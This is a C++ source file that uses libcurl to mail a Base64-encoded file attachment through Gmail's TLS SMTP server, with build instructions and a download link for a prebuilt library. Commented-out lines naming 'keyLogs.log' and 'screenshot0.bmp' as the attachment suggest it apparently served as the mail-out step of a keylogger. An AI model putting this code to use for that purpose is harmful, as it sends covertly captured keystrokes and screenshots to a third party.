/* C++ TLS SMTP eMail File Send example using libCurl. This code demonstrates how to use libCurl to connect to GMail's TLS SMTP
   Server and send an eMail with a Base64 encoded attachment. I've used Microsoft Visual Studio 2010 to compile this code. You'll
   need to download and install the C++ libCurl library for this to compile correctly. I've uploaded a ready to use compiled cURL
   library here: https://docs.google.com/uc?id=0BzOJ0-XuaQSTU3RHQkRfbVpmcnM&export=download Download this ZIP and extract the
   contents anywhere on your computer. Quick How-To on using MSVS2010 to compile this:
   1. Open Visual Studio 2010, click File -> New -> Project.
   2. On the left side select Visual C++ -> General -> Empty Project (Type in a Name and click OK)
   3. In the Solution Explorer window Right Click 'Source Files' folder and select Add -> New Item
   4. Select 'C++ File (.cpp)' (Type in a Name and click OK)
   5. Copy and Paste this code into the newly created .cpp file and Click Into the int Main() function
   6. Click Project menu -> 'ProjectName Properties' (at the bottom)
   7. On the left select Configuration Properties -> VC++ Directories
   8. On the Right select Include Directories and add libCurl's include directory
   9. On the Right select Library Directories and add libCurl's Library directory (Static-Debug folder)
  10. On the left select C/C++ -> Preprocessor and add 'CURL_STATICLIB' (no quotes) to the Preprocessor Definitions
  11. Now you are ready to Compile, Click Build -> Build Solution
*/
#define CURL_STATICLIB
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <stdlib.h>
#include<cstring>
#include "curl/curl.h"

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(_CYGWIN_)
    #include <AtlBase.h>
    #include <AtlConv.h>
    #pragma warning(disable: 4996)  //Disable Function or Variable may be unsafe warning

    #pragma comment (lib, "Normaliz.lib")
    #pragma comment (lib, "Ws2_32.lib")
    #pragma comment (lib, "Wldap32.lib")
    #pragma comment (lib, "CRYPT32.LIB")
#endif

std::string FROM;
std::string TO;
std::string FILENAME;
#define MAX_PATH_SZ 1024
//#define FILENAME "keyLogs.log"
//#define PIC_FILE "screenshot0.bmp"

static const int CHARS = 76;     //Sending 54 chararcters at a time with \r , \n and \0 it becomes 57
static const int ADD_SIZE = 7;   // ADD_SIZE for TO,FROM,SUBJECT,CONTENT-TYPE,CONTENT-TRANSFER-ENCODING,CONETNT-DISPOSITION and \r\n
static const int SEND_BUF_SIZE = 54;
static char(*fileBuf)[CHARS] = NULL;
static const char cb64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

using namespace std;

bool LARGEFILE = false; /*For Percent*/
int status = 0;   /*For Percent*/
int percent2 = 0; /*For Percent*/
int percent3 = 0; /*For Percent*/
int percent4 = 0; /*For Percent*/
int percent5 = 0; /*For Percent*/
void LargeFilePercent(int rowcount)
{
    //This is for displaying the percentage
    //while encoding larger files
    int percent = rowcount / 100;

    if (LARGEFILE == true) {
        status++;
        percent2++;
        if (percent2 == 18) {
            percent3++;
            percent2 = 0;
        }
        if (percent3 == percent) {
            percent4++;
            percent3 = 0;
        }
        if (percent4 == 10) {
            system("cls");
            cout << "Larger Files take longer to encode, Please be patient." << endl
                << "Otherwise push X to exit program now." << endl << endl
                << "(Push Anykey to Continue)" << endl
                << endl << "Encoding " + FILENAME+  " please be patient..." << endl;
            cout << percent5 << "%";
            percent5 += 10;
            percent4 = 0;
        }
        if (status == 10000) {
            if (percent5 == 0) { cout << " 0%"; percent5 = 10; }
            cout << ".";
            status = 0;
        }
    }
}

void encodeblock(unsigned char in[3], unsigned char out[4], int len)
{
    out[0] = cb64[in[0] >> 2];
    out[1] = cb64[((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4)];
    out[2] = (unsigned char)(len > 1 ? cb64[((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6)] : '=');
    out[3] = (unsigned char)(len > 2 ? cb64[in[2] & 0x3f] : '=');
}

void encode(FILE* infile, unsigned char* output_buf, int rowcount/*For Percent*/)
{
    unsigned char in[3], out[4];
    int i, len;
    *output_buf = 0;

    while (!feof(infile)) {
        len = 0;
        for (i = 0; i < 3; i++) {
            in[i] = (unsigned char)getc(infile);
            if (!feof(infile)) {
                len++;
            }
            else {
                in[i] = 0;
            }
        }
        if (len) {
            encodeblock(in, out, len);
            strncat((char*)output_buf, (char*)out, 4);
        }
        LargeFilePercent(rowcount); //Display encoded file percent /*For Percent*/
    }
}


struct fileBuf_upload_status
{
    int lines_read;
};

size_t read_file()
{
    FILE* hFile = NULL;
    size_t fileSize(0), len(0), buffer_size(0);
    char key = ' ';

    //Open the file and make sure it exsits
    hFile = fopen(FILENAME.c_str(), "rb");
    if (!hFile) {
        cout << "File not found!!!" << endl;
        //std::cin.get();
        exit(EXIT_FAILURE);
    }

    std::string fileName = "";
    int n = strlen(FILENAME.c_str()), i = 0;
    i = n-1;
    while (i > 0 && FILENAME[i] != '\\') {
        i--;
    }

    i++;
    while (i < n) {
        fileName += FILENAME[i];
        i++;
    }

    //Get filesize
    fseek(hFile, 0, SEEK_END);
    fileSize = ftell(hFile);
    fseek(hFile, 0, SEEK_SET);

    //Check Filesize, if larger then 256kb prompt user
    if (fileSize > 256000/*bytes*/) {
        /*cout << "Larger Files take longer to encode, Please be patient." << endl
            << "Otherwise push X to exit program now." << endl << endl
            << "(Push Anykey to Continue)" << endl;
        key = std::cin.get();*/
        if (tolower(key) == 'x')
            exit(EXIT_SUCCESS);
        LARGEFILE = true; /*For Percent*/
    }
    cout << endl << "Encoding " + FILENAME + " please be patient..." << endl;

    //Calculate the number of rows in Base64 encoded string
    //also calculate the size of the new char to be created
    //for the base64 encode string
    int no_of_rows = fileSize / SEND_BUF_SIZE + 1;
    int charsize = (no_of_rows * 72) + (no_of_rows * 2);

    //Base64 encode image and create encoded_buf string
    unsigned char* b64encode = new unsigned char[charsize];
    *b64encode = 0;
    encode(hFile, b64encode, no_of_rows /*For Percent*/);
    string encoded_buf = (char*)b64encode;

    if (LARGEFILE == true) cout << endl << endl; /*For Percent*/

    //Create structure of email to be sent
    fileBuf = new char[ADD_SIZE + no_of_rows][CHARS];  //ADD_SIZE for TO,FROM,SUBJECT,CONTENT-TYPE,CONTENT-TRANSFER-
                                                       //ENCODING,CONETNT-DISPOSITION and \r\n
    std::string toEmailStr = std::string("To: " + TO + "\r\n");
    strcpy(fileBuf[len++], toEmailStr.c_str());
    buffer_size += strlen(fileBuf[len - 1]);
    std::string fromEmailStr = std::string("From: " + FROM + "\r\n");
    strcpy(fileBuf[len++], fromEmailStr.c_str());
    buffer_size += strlen(fileBuf[len - 1]);
    strcpy(fileBuf[len++], "Subject: SMTP TLS example message\r\n");
    buffer_size += strlen(fileBuf[len - 1]);
    std::string contentTypeStr = "Content-Type: application/x-msdownload; name=\"" + fileName + "\"\r\n";
    strcpy(fileBuf[len++], contentTypeStr.c_str());
    buffer_size += strlen(fileBuf[len - 1]);
    strcpy(fileBuf[len++], "Content-Transfer-Encoding: base64\r\n");
    buffer_size += strlen(fileBuf[len - 1]);
    contentTypeStr = "";
    contentTypeStr = "Content-Disposition: attachment; filename=\"" +fileName+ "\"\r\n";
    strcpy(fileBuf[len++], contentTypeStr.c_str());
    buffer_size += strlen(fileBuf[len - 1]);
    strcpy(fileBuf[len++], "\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    //This part attaches the Base64 encoded string and
    //sets the Base64 linesize to 72 characters + \r\n
    int pos = 0;
    string sub_encoded_buf;
    for (int i = 0; i <= no_of_rows - 1; i++)
    {
        sub_encoded_buf = encoded_buf.substr(pos * 72, 72);  //Reads 72 characters at a time
        sub_encoded_buf += "\r\n";                        //and appends \r\n at the end
        strcpy(fileBuf[len++], sub_encoded_buf.c_str());  //copy the 72 characters & \r\n to email
        buffer_size += sub_encoded_buf.size();            //now increase the buffer_size  
        pos++;                                            //finally increase pos by 1
    }
    //////////////////////////////////////////////////////////////////////
    // The following code prints the structure of the email being sent.//
    //    printf("Images Base64 encoded string:\n\n\t\t\t std::string" //
    //         "encoded_buf\n%s\n",encoded_buf.c_str());               //
    //    printf("\n\t\t\tStructure of Email being sent:\n");          //
    //      for (int i=0;i<no_of_rows + ADD_SIZE;++i){                 //
    //            printf("%s",fileBuf[i]); }                           //
    //      printf("\nbuffer size: %d\n",buffer_size);                 //
    /////////////////////////////////////////////////////////////////////
    //    /* Push X to Exit the program after viewing                  //
    //       the structure of the email */                             //
    //    printf("Push X to exit program now, otherwise continue\n");  //
    //       key = std::cin.get();                                           //
    //       if(tolower(key) == 'x')                                   //
    //               exit (EXIT_SUCCESS);                              //
    /////////////////////////////////////////////////////////////////////
    
    fclose(hFile);
    delete[] b64encode;
    return buffer_size;
}

/*
 The fileBuf_source() is a function which CURL calls when it need to obtain data that will be uploaded to the server.
 Imagine that fileBuf_source() is something similar to fread(). When called it performs any voodoo-mumbo-jumbo that is needed,
 but in the end uploadable data must be stored in *ptr buffer, which is curl's internal buffer. For your in-memory buffer
 memcpy() will do just fine as body of fileBuf_source(), so you don't need real fread() at all.

 size * nmemb tells you how big buffer curl has reserved for a single chunk of data. The last void* is a pointer which was
 set by CURLOPT_READDATA option - it's a do-what-ever-you-need-with-it kind of pointer, so it can point to a structure
 containing data which you're uploading and a some additional info e.g. current progress.
 */
static size_t fileBuf_source(void* ptr, size_t size, size_t nmemb, void* userp)
{
    struct fileBuf_upload_status* upload_ctx = (struct fileBuf_upload_status*)userp;
    const char* fdata;

    if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1))
    {
        return 0;
    }

    fdata = fileBuf[upload_ctx->lines_read];

    if (strcmp(fdata, ""))
    {
        size_t len = strlen(fdata);
        memcpy(ptr, fdata, len);
        upload_ctx->lines_read++;
        return len;
    }
    return 0;
}

namespace curlSendMail {
    int sendFinalmail(std::string _ToEMail, std::string _FromEMail, std::string& _loginUserName, std::string& _loginPassword, 
        std::string& _FileNameWithPath, const std::string& _fileNameWithoutPath = "attachement.zip")
    {
        TO = std::move(_ToEMail);
        FROM = std::move(_FromEMail);
        FILENAME = std::move(_FileNameWithPath);
        char currDir[MAX_PATH_SZ];
        GetCurrentDirectoryA(MAX_PATH_SZ, currDir);

        std::string FULL_FILENAME = FILENAME;

        std::string fullFilePath = std::string(currDir) + "\\" + _fileNameWithoutPath;

        CopyFileA(FULL_FILENAME.c_str(), fullFilePath.c_str(), FALSE);

        CURL* curl;
        CURLcode res = CURLE_OK;
        struct curl_slist* recipients = NULL;
        struct fileBuf_upload_status file_upload_ctx;
        size_t file_size(0);

        file_upload_ctx.lines_read = 0;


        curl = curl_easy_init();
        file_size = read_file();
        if (curl)
        {
            curl_easy_setopt(curl, CURLOPT_USERNAME, _loginUserName.c_str());
            curl_easy_setopt(curl, CURLOPT_PASSWORD, _loginPassword.c_str());
            curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
            curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
            //curl_easy_setopt(curl, CURLOPT_CAINFO, "google.pem");
            curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM.c_str());
            recipients = curl_slist_append(recipients, TO.c_str());
            curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
            curl_easy_setopt(curl, CURLOPT_INFILESIZE, file_size);
            curl_easy_setopt(curl, CURLOPT_READFUNCTION, fileBuf_source);
            curl_easy_setopt(curl, CURLOPT_READDATA, &file_upload_ctx);
            curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //Dont display Curl Connection data Change 1L to 0

            res = curl_easy_perform(curl);

            if (res != CURLE_OK)
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            curl_slist_free_all(recipients);
            curl_easy_cleanup(curl);
        }
        delete[] fileBuf;
        //std::cin.get();
        return (int)res;
    }
}
